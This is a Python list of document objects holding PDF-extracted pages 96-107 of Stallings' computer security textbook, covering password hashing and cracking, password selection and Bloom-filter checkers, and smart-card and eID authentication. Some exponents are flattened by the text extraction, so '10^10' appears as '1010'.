converts it into a one-way hash function. The crypt(3) routine is designed to \\ndiscourage guessing attacks. Software implementations of DES are slow compared \\nto hardware versions, and the use of 25 iterations multiplies the time required  \\nby 25.\\nThis particular implementation is now considered woefully inadequate. For \\nexample, [PERR03] reports the results of a dictionary attack using a supercomputer. \\nThe attack was able to process over 50 million password guesses in about 80 minutes. \\nFurther, the results showed that for about $10,000, anyone should be able to do the \\nsame in a few months using one uniprocessor machine. Despite its known weaknesses, \\nthis UNIX scheme is still often required for compatibility with existing account man-\\nagement software or in multivendor environments.\\nThere are other much stronger hash/salt schemes available for UNIX. The \\n recommended hash function for many UNIX systems, including Linux, Solaris, and \\nFreeBSD (a widely used open source UNIX), is based on the MD5 secure hash algo-\\nrithm (which is similar to, but not as secure as SHA-1). The MD5 crypt routine uses a \\nsalt of up to 48 bits and effectively has no limitations on password length. It produces \\na 128-bit hash value. It is also far slower than crypt(3). To achieve the slowdown, MD5 \\ncrypt uses an inner loop with 1000 iterations.\\nProbably the most secure version of the UNIX hash/salt scheme was developed \\nfor OpenBSD, another widely used open source UNIX. This scheme, reported in \\n[PROV99], uses a hash function based on the Blowfish symmetric block cipher. The \\nhash function, called Bcrypt, is quite slow to execute. Bcrypt allows passwords of up \\nto 55 characters in length and requires a random salt value of 128 bits, to produce a \\n192-bit hash value. Bcrypt also includes a cost variable; an increase in the cost vari -\\nable causes a corresponding increase in the time required to perform a Bcyrpt hash. \\nThe cost assigned to a new password is configurable, so administrators can assign a \\nhigher cost to privileged users.\\nM03_STAL0611_04_GE_C03.indd   96 10/11/17   2:44 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 98, 'page_label': '97'}, page_content='3.2 / PAssWoRD-BAsED AUTHEnTiCATion  97\\nPassword Cracking of User-Chosen Passwords\\ntrAdition AL A PProAches  The traditional approach to password guessing, \\nor passwor d cracking as it is called, is to develop a large dictionary of possible \\n passwords and to try each of these against the passwor d file. This means that each \\npassword must be hashed using each available salt value then compared with \\nstored hash values. If no match is found, the cracking program tries variations on \\nall the words in its dictionary of likely passwords. Such variations include back -\\nward  spelling of wor ds, additional numbers or special characters, or sequence of \\ncharacters.\\nAn alternative is to trade off space for time by precomputing potential hash \\nvalues. In this approach the attacker generates a large dictionary of possible pass -\\nwords. For each password, the attacker generates the hash values associated with \\neach possible salt value. The result is a mammoth table of hash values known as a \\nrainbow table. For example, [OECH03] showed that using 1.4 GB of data, he could \\ncrack 99.9% of all alphanumeric Windows password hashes in 13.8 seconds. This \\napproach can be countered using a sufficiently large salt value and a sufficiently large \\nhash length. Both the FreeBSD and OpenBSD approaches should be secure from \\nthis attack for the foreseeable future.\\nTo counter the use of large salt values and hash lengths, password crackers \\nexploit the fact that some people choose easily guessable passwords. A particular \\nproblem is that users, when permitted to choose their own password, tend to choose \\nshort ones. [BONN12] summarizes the results of a number of studies over the past \\nfew years involving over 40 million hacked passwords, as well as their own analysis \\nof almost 70 million anonymized passwords of Yahoo! users, and found a tendency \\ntoward six to eight characters of length and a strong dislike of non-alphanumeric \\ncharacters in passwords.\\nThe analysis of the 70 million passwords in [BONN12] estimates that pass -\\nwords provide fewer than 10 bits of security against an online, trawling attack, \\nand only about 20 bits of security against an optimal offline dictionary attack. In \\nother words, an attacker who can manage 10 guesses per account, typically within \\nthe realm of rate-limiting mechanisms, will compromise around 1% of accounts, \\njust as they would against random 10-bit strings. Against an optimal attacker \\nperforming unrestricted brute force and wanting to break half of all available \\naccounts, passwords appear to be roughly equivalent to 20-bit random strings.  \\nIt can be seen then that using offline search enables an adversary to break  \\na large number of accounts, even if a significant amount of iterated hashing is \\nused.\\nPassword length is only part of the problem. Many people, when permitted \\nto choose their own password, pick a password that is guessable, such as their own \\nname, their street name, a common dictionary word, and so forth. This makes the job \\nof password cracking straightforward. The cracker simply has to test the password \\nfile against lists of likely passwords. Because many people use guessable passwords, \\nsuch a strategy should succeed on virtually all systems.\\nOne demonstration of the effectiveness of guessing is reported in [KLEI90]. \\nFrom a variety of sources, the author collected UNIX password files, containing \\nnearly 14,000 encrypted passwords. The result, which the author rightly characterizes \\nM03_STAL0611_04_GE_C03.indd   97 10/11/17   2:44 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 99, 'page_label': '98'}, page_content='98  CHAPTER 3 / UsER AUTHEnTiCATion\\nas frightening, was that in all, nearly one-fourth of the passwords were guessed. The \\nfollowing strategy was used:\\n1. Try the user’s name, initials, account name, and other relevant personal informa-\\ntion. In all, 130 different permutations for each user were tried.\\n2. Try words from various dictionaries. The author compiled a dictionary of over \\n60,000 words, including the online dictionary on the system itself, and various \\nother lists as shown.\\n3. Try various permutations on the words from step 2. This included making the \\nfirst letter uppercase or a control character, making the entire word uppercase, \\nreversing the word, changing the letter “o” to the digit “zero,” and so on. These \\npermutations added another 1 million words to the list.\\n4. Try various capitalization permutations on the words from step 2 that were not \\nconsidered in step 3. This added almost 2 million additional words to the list.\\nThus, the test involved nearly 3 million words. Using the fastest processor available, \\nthe time to encrypt all these words for all possible salt values was under an hour. \\nKeep in mind that such a thorough search could produce a success rate of about \\n25%, whereas even a single hit may be enough to gain a wide range of privileges on \\na system.\\nAttacks that use a combination of brute-force and dictionary techniques have \\nbecome common. A notable example of this dual approach is John the Ripper, an \\nopen-source password cracker first developed in 1996, and still in use [OPEN13].\\nmodern APProAches Sadly, this type of vulnerability has not lessened in the past \\n25 years or so. Users are doing a better job of selecting passwords, and organiza -\\ntions are doing a better job of forcing users to pick stronger passwords, a concept \\nknown as a complex password policy, as discussed subsequently. However, password-\\ncracking techniques have improved to keep pace. The improvements are of two \\nkinds. First, the processing capacity available for password cracking has increased \\ndramatically. Now used increasingly for computing, graphics processors allow \\npassword- cracking programs to work thousands of times faster than they did just a \\ndecade ago on similarly priced PCs that used traditional CPUs alone. A PC running \\na single AMD Radeon HD7970 GPU, for instance, can try on average an 8.2 * 109 \\npassword combinations each second, depending on the algorithm used to scramble \\nthem [GOOD12a]. Only a decade ago, such speeds were possible only when using \\npricey supercomputers.\\nThe second area of improvement in password cracking is in the use of sophisti-\\ncated algorithms to generate potential passwords. For example, [NARA05] developed \\na model for password generation using the probabilities of letters in natural language. \\nThe researchers used standard Markov modeling techniques from natural language \\nprocessing to dramatically reduce the size of the password space to be searched.\\nBut the best results have been achieved by studying examples of actual pass -\\nwords in use. To develop techniques that are more efficient and effective than simple \\ndictionary and brute-force attacks, researchers and hackers have studied the struc -\\nture of passwords. To do this, analysts need a large pool of real-word passwords to \\nstudy, which they now have. The first big breakthrough came in late 2009, when an \\nSQL injection attack against online games service RockYou.com exposed 32 million \\nM03_STAL0611_04_GE_C03.indd   98 10/11/17   2:44 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 100, 'page_label': '99'}, page_content='3.2 / PAssWoRD-BAsED AUTHEnTiCATion  99\\nplaintext passwords used by its members to log in to their accounts [TIMM10]. Since \\nthen, numerous sets of leaked password files have become available for analysis.\\nUsing large datasets of leaked passwords as training data, [WEIR09] reports \\non the development of a probabilistic context-free grammar for password cracking. \\nIn this approach, guesses are ordered according to their likelihood, based on the fre-\\nquency of their character-class structures in the training data, as well as the frequency \\nof their digit and symbol substrings. This approach has been shown to be efficient in \\npassword cracking [KELL12, ZHAN10].\\n[MAZU13] reports on an analysis of the passwords used by over 25,000  students \\nat a research university with a complex password policy. The analysts used the pass-\\nword-cracking approach introduced in [WEIR09]. They used a database consisting \\nof a collection of leaked password files, including the RockYou file.  Figure 3.4 sum-\\nmarizes a key result from the paper. The graph shows the percentage of passwords \\nthat have been recovered as a function of the number of guesses. As can be seen, over \\n10% of the passwords are recovered after only 1010 guesses. After 1013 guesses, almost \\n40% of the passwords are recovered.\\nPassword File Access Control\\nOne way to thwart a password attack is to deny the opponent access to the password \\nfile. If the hashed password portion of the file is accessible only by a privileged user, \\nthen the opponent cannot read it without already knowing the password of a privi -\\nleged user. Often, the hashed passwords are kept in a separate file from the user IDs, \\nreferred to as a shadow password file. Special attention is paid to making the shadow \\nFigure 3.4 The Percentage of Passwords Guessed After a Given Number of Guesses\\n0%\\n104 107 1010 1013\\n10%\\nPercent guessed\\nNumber of guesses\\n20%\\n30%\\n40%\\n50%\\nM03_STAL0611_04_GE_C03.indd   99 10/11/17   2:44 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 101, 'page_label': '100'}, page_content='100  CHAPTER 3 / UsER AUTHEnTiCATion\\npassword file protected from unauthorized access. Although password file protection \\nis certainly worthwhile, there remain vulnerabilities:\\n• Many systems, including most UNIX systems, are susceptible to unanticipated \\nbreak-ins. A hacker may be able to exploit a software vulnerability in the oper-\\nating system to bypass the access control system long enough to extract the \\npassword file. Alternatively, the hacker may find a weakness in the file system \\nor database management system that allows access to the file.\\n• An accident of protection might r ender the password file readable, thus com-\\npromising all the accounts.\\n• Some of the users have accounts on other machines in other protection domains, \\nand they use the same password. Thus, if the passwords could be read by anyone \\non one machine, a machine in another location might be compromised.\\n• A lack of, or weakness in, physical security may provide opportunities for a \\nhacker. Sometimes, there is a backup to the password file on an emergency \\nrepair disk or archival disk. Access to this backup enables the attacker to read \\nthe password file. Alternatively, a user may boot from a disk running another \\noperating system such as Linux and access the file from this OS.\\n• Instead of capturing the system password file , another approach to collecting \\nuser IDs and passwords is through sniffing network traffic.\\nThus, a password protection policy must complement access control measures with \\ntechniques to force users to select passwords that are difficult to guess.\\nPassword Selection Strategies\\nWhen not constrained, many users choose a password that is too short or too \\neasy to guess. At the other extreme, if users are assigned passwords consisting \\nof eight randomly selected printable characters, password cracking is effectively \\nimpossible. But it would be almost as impossible for most users to remember their \\npasswords. Fortunately, even if we limit the password universe to strings of char -\\nacters that are reasonably memorable, the size of the universe is still too large to \\npermit practical cracking. Our goal, then, is to eliminate guessable passwords while \\nallowing the user to select a password that is memorable. Four basic techniques \\nare in use:\\n• User education\\n• Computer-generated passwords\\n• Reactive password checking\\n• Complex password policy\\nUsers can be told the importance of using hard-to-guess passwords and can be \\nprovided with guidelines for selecting strong passwords. This user education strategy \\nis unlikely to succeed at most installations, particularly where there is a large user \\npopulation or a lot of turnover. Many users will simply ignore the guidelines.  Others \\nmay not be good judges of what is a strong password. For example, many users (mis-\\ntakenly) believe that reversing a word or capitalizing the last letter makes a password \\nunguessable.\\nM03_STAL0611_04_GE_C03.indd   100 10/11/17   2:44 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 102, 'page_label': '101'}, page_content='3.2 / PAssWoRD-BAsED AUTHEnTiCATion  101\\nNonetheless, it makes sense to provide users with guidelines on the selection \\nof passwords. Perhaps the best approach is the following advice: A good technique \\nfor choosing a password is to use the first letter of each word of a phrase. How -\\never, do not pick a well-known phrase like “An apple a day keeps the doctor away” \\n(Aaadktda). Instead, pick something like “My dog’s first name is Rex” (MdfniR) or \\n“My sister Peg is 24 years old” (MsPi24yo). Studies have shown users can generally \\nremember such passwords, but they are not susceptible to password guessing attacks \\nbased on commonly used passwords.\\nComputer-generated passwords also have problems. If the passwords are quite \\nrandom in nature, users will not be able to remember them. Even if the password is \\npronounceable, the user may have difficulty remembering it and so be tempted to write \\nit down. In general, computer-generated password schemes have a history of poor accep-\\ntance by users. FIPS 181 defines one of the best-designed automated password genera-\\ntors. The standard includes not only a description of the approach but also a complete \\nlisting of the C source code of the algorithm. The algorithm generates words by forming \\npronounceable syllables and concatenating them to form a word. A random number gen-\\nerator produces a random stream of characters used to construct the syllables and words.\\nA reactive password checking strategy is one in which the system periodically \\nruns its own password cracker to find guessable passwords. The system cancels any \\npasswords that are guessed and notifies the user. This tactic has a number of draw -\\nbacks. First, it is resource intensive if the job is done right. Because a determined \\nopponent who is able to steal a password file can devote full CPU time to the task for \\nhours or even days, an effective reactive password checker is at a distinct disadvan-\\ntage. Furthermore, any existing passwords remain vulnerable until the reactive pass-\\nword checker finds them. A good example is the openware Jack the Ripper password \\ncracker (openwall.com/john/pro/), which works on a variety of operating systems.\\nA promising approach to improved password security is a complex password \\npolicy, or proactive password checker. In this scheme, a user is allowed to select his or \\nher own password. However, at the time of selection, the system checks to see if the \\npassword is allowable and, if not, rejects it. Such checkers are based on the philosophy \\nthat, with sufficient guidance from the system, users can select memorable passwords \\nfrom a fairly large password space that are not likely to be guessed in a dictionary attack.\\nThe trick with a proactive password checker is to strike a balance between user \\nacceptability and strength. If the system rejects too many passwords, users will com-\\nplain that it is too hard to select a password. If the system uses some simple algorithm \\nto define what is acceptable, this provides guidance to password crackers to refine \\ntheir guessing technique. In the remainder of this subsection, we will look at possible \\napproaches to proactive password checking.\\nruLe enforcement The first approach is a simple system for rule enforcement. \\nFor example, NIST SP 800-63-2 suggests the following alternative rules:\\n• Password must have at least sixteen characters (basic16).\\n• Password must have at least eight characters including an uppercase and \\nlowercase letter, a symbol, and a digit. It may not contain a dictionary word \\n(comprehensive8).\\nAlthough NIST considers basic16 and comprehensive8 equivalent, [KELL12] \\nfound that basic16 is superior against large numbers of guesses. Combined with a \\nM03_STAL0611_04_GE_C03.indd   101 10/11/17   2:44 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 103, 'page_label': '102'}, page_content='102  CHAPTER 3 / UsER AUTHEnTiCATion\\nprior result that basic16 is also easier for users [KOMA11], this suggests basic16 is \\nthe better policy choice.\\nAlthough this approach is superior to simply educating users, it may not be suf-\\nficient to thwart password crackers. This scheme alerts crackers as to which passwords \\nnot to try, but may still make it possible to do password cracking.\\nThe process of rule enforcement can be automated by using a proactive pass -\\nword checker, such as the openware pam_passwdqc (openwall.com/passwdqc/), which \\nenforces a variety of rules on passwords and is configurable by the system administrator.\\nPAssword checker Another possible procedure is simply to compile a large dic-\\ntionary of possible “bad” passwords. When a user selects a password, the system \\nchecks to make sure that it is not on the disapproved list. There are two problems \\nwith this approach:\\n• Space: The dictionary must be very large to be effective.\\n• Time: The time required to search a large dictionary may itself be large. In addi-\\ntion, to check for likely permutations of dictionary words, either those words \\nmust be included in the dictionary, making it truly huge, or each search must \\nalso involve considerable processing.\\nBLoom fiLter A technique [SPAF92a,  SPAF92b] for developing an effective \\nand efficient proactive password checker that is based on rejecting words on a list \\nhas been implemented on a number of systems, including Linux. It is based on the \\nuse of a Bloom filter [BLOO70]. To begin, we explain the operation of the Bloom \\nfilter. A Bloom filter of order k consists of a set of k independent hash functions \\nH1(x), H2(x), c, Hk(x), where each function maps a password into a hash value in \\nthe range 0 to N - 1. That is,\\nHi(Xj) = y  1 … i … k;  1 … j … D;  0 … y … N - 1\\nwhere\\n Xj = jth word in password dictionary\\n D = number of words in password dictionary\\nThe following procedure is then applied to the dictionary:\\n1. A hash table of N bits is defined, with all bits initially set to 0.\\n2. For each password, its k hash values are calculated, and the corresponding bits \\nin the hash table are set to 1. Thus, if Hi (Xj) = 67 for some ( i, j), then the \\nsixty-seventh bit of the hash table is set to 1; if the bit already has the value 1, \\nit remains at 1.\\nWhen a new password is presented to the checker, its k hash values are calcu-\\nlated. If all the corresponding bits of the hash table are equal to 1, then the password \\nis rejected. All passwords in the dictionary will be rejected. But there will also be \\nsome “false positives” (i.e., passwords that are not in the dictionary but that produce \\na match in the hash table). To see this, consider a scheme with two hash functions. \\nSuppose the passwords undertaker and hulkhogan are in the dictionary, but xG%#jj98 \\nis not. Further suppose that\\nM03_STAL0611_04_GE_C03.indd   102 10/11/17   2:44 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 104, 'page_label': '103'}, page_content='3.2 / PAssWoRD-BAsED AUTHEnTiCATion  103\\nH1(undertaker) = 25 H1 (hulkhogan) = 83 H1 (xG%#jj98) = 665\\nH2(undertaker) = 998 H2 (hulkhogan) = 665 H2 (xG%#jj98) = 998\\nIf the password xG%#jj98 is presented to the system, it will be rejected even \\nthough it is not in the dictionary. If there are too many such false positives, it will be \\ndifficult for users to select passwords. Therefore, we would like to design the hash \\nscheme to minimize false positives. It can be shown that the probability P of a false \\npositive can be approximated by\\nP /uni2248(1 - e-kD/N)k = (1 - e-k/R)k\\nor, equivalently,\\nR /uni2248-k\\nln(1 - p1/k)\\nwhere\\n k = number of hash functions\\n N = number of bits in hash table\\n D = number of words in dictionary\\n R = N/D, ratio of hash table size (bits) to dictionary size (words)\\nFigure 3.5 plots P as a function of R for various values of k. Suppose we have a \\ndictionary of 1 million words, and we wish to have a 0.01 probability of rejecting a \\nFigure 3.5 Performance of Bloom Filter\\n0.001\\n0.01\\n0.1\\n1\\nPr[false positive]\\n2 0151050\\nRatio of hash table size (bits) to dictionary size (words) \\n4 hash functions\\n2 hash functions\\n6 hash functions\\nM03_STAL0611_04_GE_C03.indd   103 10/11/17   2:44 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 105, 'page_label': '104'}, page_content='104  CHAPTER 3 / UsER AUTHEnTiCATion\\npassword not in the dictionary. If we choose six hash functions, the required ratio is \\nR = 9.6. Therefore, we need a hash table of 9.6 * 106 bits or about 1.2 MB of storage. \\nIn contrast, storage of the entire dictionary would require on the order of 8 MB. Thus, \\nwe achieve a compression of almost a factor of 7 . Furthermore, password checking \\ninvolves the straightforward calculation of six hash functions and is independent of \\nthe size of the dictionary, whereas with the use of the full dictionary, there is substan-\\ntial searching.2\\n 3.3 TOKEN-BASED AUTHENTICATION\\nObjects that a user possesses for the purpose of user authentication are called tokens. \\nIn this section, we examine two types of tokens that are widely used; these are cards \\nthat have the appearance and size of bank cards (see Table 3.3).\\nMemory Cards\\nMemory cards can store but not process data. The most common such card is the bank \\ncard with a magnetic stripe on the back. A magnetic stripe can store only a simple \\nsecurity code, which can be read (and unfortunately reprogrammed) by an inexpensive \\ncard reader. There are also memory cards that include an internal electronic memory.\\nMemory cards can be used alone for physical access, such as a hotel room. For \\nauthentication, a user provides both the memory card and some form of password \\nor personal identification number (PIN). A typical application is an automatic teller \\nmachine (ATM). The memory card, when combined with a PIN or password, provides \\nsignificantly greater security than a password alone. An adversary must gain physical \\npossession of the card (or be able to duplicate it) plus must gain knowledge of the \\nPIN. Among the potential drawbacks NIST SP 800-12 (An Introduction to Computer \\nSecurity: The NIST Handbook, October 1995) notes the following:\\n• Requires special reader: This increases the cost of using the token and creates \\nthe requirement to maintain the security of the reader’s hardware and software.\\n2The Bloom filter involves the use of probabilistic techniques. There is a small probability that some \\npasswords not in the dictionary will be rejected. It is often the case in designing algorithms that the use of \\nprobabilistic techniques results in a less time-consuming or less complex solution, or both.\\nCard Type Defining Feature Example\\nEmbossed Raised characters only, on front Old credit card\\nMagnetic stripe Magnetic bar on back, characters on front Bank card\\nMemory Electronic memory inside Prepaid phone card\\nSmart\\n Contact\\n Contactless\\nElectronic memory and processor inside\\n Electrical contacts exposed on surface\\n Radio antenna embedded inside\\nBiometric ID card\\nTable 3.3 Types of Cards Used as Tokens\\nM03_STAL0611_04_GE_C03.indd   104 10/11/17   2:44 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 106, 'page_label': '105'}, page_content='3.3 / ToKEn-BAsED AUTHEnTiCATion  105\\n• Token loss: A lost token temporarily prevents its owner from gaining  system \\naccess. Thus, there is an administrative cost in replacing the lost token. In \\n addition, if the token is found, stolen, or forged, then an adversary need only \\ndetermine the PIN to gain unauthorized access.\\n• User dissatisfaction: Although users may have no difficulty in accepting the use \\nof a memory card for ATM access, its use for computer access may be deemed \\ninconvenient.\\nSmart Cards\\nA wide variety of devices qualify as smart tokens. These can be categorized along \\nfour dimensions that are not mutually exclusive:\\n• Physical characteristics:  Smart tokens include an embedded microprocessor. \\nA smart token that looks like a bank card is called a smart card. Other smart \\ntokens can look like calculators, keys, or other small portable objects.\\n• User interface:  Manual interfaces include a keypad and display for human/ \\ntoken interaction.\\n• Electronic interface: A smart card or other token requires an electronic inter-\\nface to communicate with a compatible reader/writer. A card may have one or \\nboth of the following types of interface:\\n — Contact: A contact smart card must be inserted into a smart card reader \\nwith a direct connection to a conductive contact plate on the surface of the \\ncard (typically gold plated). Transmission of commands, data, and card status \\ntakes place over these physical contact points.\\n — Contactless: A contactless card requires only close proximity to a reader. \\nBoth the reader and the card have an antenna, and the two communicate \\nusing radio frequencies. Most contactless cards also derive power for the \\ninternal chip from this electromagnetic signal. The range is typically one-half \\nto three inches for non-battery-powered cards, ideal for applications such as \\nbuilding entry and payment that require a very fast card interface.\\n• Authentication protocol: The purpose of a smart token is to provide a means \\nfor user authentication. We can classify the authentication protocols used with \\nsmart tokens into three categories:\\n — Static: With a static protocol, the user authenticates himself or herself to the \\ntoken then the token authenticates the user to the computer. The latter half \\nof this protocol is similar to the operation of a memory token.\\n — Dynamic password generat or: In this case, the token generates a unique \\npassword periodically (e.g., every minute). This password is then entered \\ninto the computer system for authentication, either manually by the user \\nor electronically via the token. The token and the computer system must be \\ninitialized and kept synchronized so the computer knows the password that \\nis current for this token.\\nM03_STAL0611_04_GE_C03.indd   105 10/11/17   2:44 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 107, 'page_label': '106'}, page_content='106  CHAPTER 3 / UsER AUTHEnTiCATion\\n — Challenge-response: In this case, the computer system generates a challenge, \\nsuch as a random string of numbers. The smart token generates a response \\nbased on the challenge. For example, public-key cryptography could be used \\nand the token could encrypt the challenge string with the token’s private key.\\nFor user authentication, the most important category of smart token is the \\nsmart card, which has the appearance of a credit card, has an electronic interface, and \\nmay use any of the type of protocols just described. The remainder of this section \\ndiscusses smart cards.\\nA smart card contains within it an entire microprocessor, including processor, \\nmemory, and I/O ports. Some versions incorporate a special co-processing circuit for \\ncryptographic operation to speed the task of encoding and decoding messages or \\ngenerating digital signatures to validate the information transferred. In some cards, \\nthe I/O ports are directly accessible by a compatible reader by means of exposed \\nelectrical contacts. Other cards rely instead on an embedded antenna for wireless \\ncommunication with the reader.\\nA typical smart card includes three types of memory. Read-only memory (ROM) \\nstores data that does not change during the card’s life, such as the card number and \\nthe cardholder’s name. Electrically erasable programmable ROM (EEPROM) holds \\napplication data and programs, such as the protocols that the card can execute. It also \\nholds data that may vary with time. For example, in a telephone card, the EEPROM \\nholds the remaining talk time. Random access memory (RAM) holds temporary data \\ngenerated when applications are executed.\\nFigure 3.6 illustrates the typical interaction between a smart card and a reader \\nor computer system. Each time the card is inserted into a reader, a reset is initiated \\nby the reader to initialize parameters such as clock value. After the reset function \\nis performed, the card responds with answer to reset (ATR) message. This message \\ndefines the parameters and protocols that the card can use and the functions it can \\nperform. The terminal may be able to change the protocol used and other parameters \\nvia a protocol type selection (PTS) command. The card’s PTS response confirms \\nthe\\xa0protocols and parameters to be used. The terminal and card can now execute the \\nprotocol to perform the desired application.\\nElectronic Identity Cards\\nAn application of increasing importance is the use of a smart card as a national \\nidentity card for citizens. A national electronic identity (eID) card can serve the same \\npurposes as other national ID cards, and similar cards such as a driver’s license, for \\naccess to government and commercial services. In addition, an eID card can provide \\nstronger proof of identity and be used in a wider variety of applications. In effect, an \\neID card is a smart card that has been verified by the national government as valid \\nand authentic.\\nOne of the most recent and most advanced eID deployments is the German eID \\ncard neuer Personalausweis [POLL12]. The card has human-readable data printed on \\nits surface, including the following:\\n• Personal data:  Such as name, date of birth, and address; this is the type of \\nprinted information found on passports and drivers’ licenses.\\nM03_STAL0611_04_GE_C03.indd   106 10/11/17   2:44 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 108, 'page_label': '107'}, page_content='3.3 / ToKEn-BAsED AUTHEnTiCATion  107\\n• Document number:  An alphanumerical nine-character unique identifier of \\neach\\xa0card.\\n• Card access number (CAN): A six-digit decimal random number printed on the \\nface of the card. This is used as a password, as explained subsequently.\\n• Machine readable zone (MRZ): Three lines of human- and machine-readable \\ntext on the back of the card. This may also be used as a password.\\neid functions The card has the following three separate electronic functions, each \\nwith its own protected dataset (see Table 3.4):\\n• ePass: This function is reserved for government use and stores a digital repre-\\nsentation of the cardholder’s identity. This function is similar to, and may be \\nused for, an electronic passport. Other government services may also use ePass. \\nThe ePass function must be implemented on the card.\\n• eID: This function is for general-purpose use in a variety of government and \\ncommercial applications. The eID function stores an identity record that autho-\\nrized service can access with cardholder permission. Citizens choose whether \\nthey want this function activated.\\n• eSign: This optional function stores a private key and a certificate verifying the \\nkey; it is used for generating a digital signature. A private sector trust center \\nissues the certificate.\\nFigure 3.6 Smart Card/Reader Exchange\\nd r a c t r a mS\\nATR\\nAPDU = Application protocol data unit\\nATR = Answer to reset\\nPTS = Protocol type selection\\nSmart Card Activation\\nEnd of Session\\nProtocol negotiation PTS\\nNegotiation Answer PTS\\nCommand APDU\\nResponse APDU\\nM03_STAL0611_04_GE_C03.indd   107 10/11/17   2:44 PM'),\n",
